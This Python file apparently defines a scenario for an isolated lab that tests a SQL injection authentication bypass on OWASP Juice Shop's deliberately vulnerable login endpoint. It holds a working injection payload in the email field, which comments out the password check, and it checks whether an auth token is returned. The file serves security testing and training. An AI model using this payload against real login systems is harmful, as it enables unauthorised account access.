"""Scenario: SQL injection in the Juice Shop login endpoint.

This targets a documented, intentional teaching vulnerability in OWASP Juice
Shop itself — the login handler builds its lookup with raw string
interpolation (the upstream source marks the line ``vuln-code-snippet
vuln-line loginAdminChallenge``), not a vulnerability discovered here. The
scenario only ever runs against the provisioned, isolated lab instance's own
proxy URL (enforced by ``ScopedClient``, not by this file's own care).

Observable, machine-checked outcome: whether any probe POSTed to
``/rest/user/login`` returns HTTP 200 with an authentication token, versus a
plain wrong-password control request (which must get 401). The specific
inputs are the single, long-published example from Juice Shop's own
documentation (used in OWASP's own training material) — nothing novel.
"""
from __future__ import annotations

from services.scenarios.base import (Scenario, ScenarioObservations, ScopedClient,
                                     SuccessCriterion)

# The one canonical example from Juice Shop's own pwning guide, for the admin
# account's known email. No credentials are discovered or guessed here.
_PROBE_EMAIL = "admin@juice-sh.op' --"
_PROBE_PASSWORD = "anything"


async def _run(client: ScopedClient, obs: ScenarioObservations) -> None:
    control = await client.request("POST", "/rest/user/login",
                                    json={"email": "no-such-user@example.invalid", "password": "wrong"})
    obs.probes["control_status"] = control.status_code

    probe = await client.request("POST", "/rest/user/login",
                                 json={"email": _PROBE_EMAIL, "password": _PROBE_PASSWORD})
    obs.probes["probe_status"] = probe.status_code
    body = {}
    if probe.status_code == 200:
        try:
            body = probe.json()
        except ValueError:
            pass
    obs.probes["probe_has_token"] = bool(body.get("authentication", {}).get("token"))
    obs.probes["probe_umail"] = body.get("authentication", {}).get("umail")
    obs.notes.append(
        f"Login with a password-less SQL comment in the email field returned "
        f"HTTP {probe.status_code}" + (f" for account {obs.probes['probe_umail']!r}." if obs.probes["probe_umail"] else "."))


def build() -> Scenario:
    return Scenario(
        id="sqli_login_bypass",
        title="SQL injection — authentication bypass on /rest/user/login",
        description=("Tests whether unsanitised input to the login email field lets a request "
                     "authenticate without a valid password, by issuing one documented probe "
                     "value and one wrong-password control."),
        lab_template="juice-shop",
        prerequisites=["A running, isolated Juice Shop lab instance."],
        permitted_target="The provisioned lab instance's own proxy URL only.",
        max_requests=5,
        timeout_s=30,
        success_criteria=[
            SuccessCriterion("control_rejected", "The wrong-password control request is rejected (401).",
                            lambda o: o.probes.get("control_status") == 401),
            SuccessCriterion("probe_authenticated",
                            "The injection probe receives a 200 with an issued auth token.",
                            lambda o: o.probes.get("probe_status") == 200 and o.probes.get("probe_has_token")),
        ],
        required_telemetry=["POST /rest/user/login (both requests, with status and redacted body)"],
        cleanup="Lab instance reset or cleanup via services.lab.provisioner (fresh SQLite DB, no persisted session).",
        available=True,
        run=_run,
    )
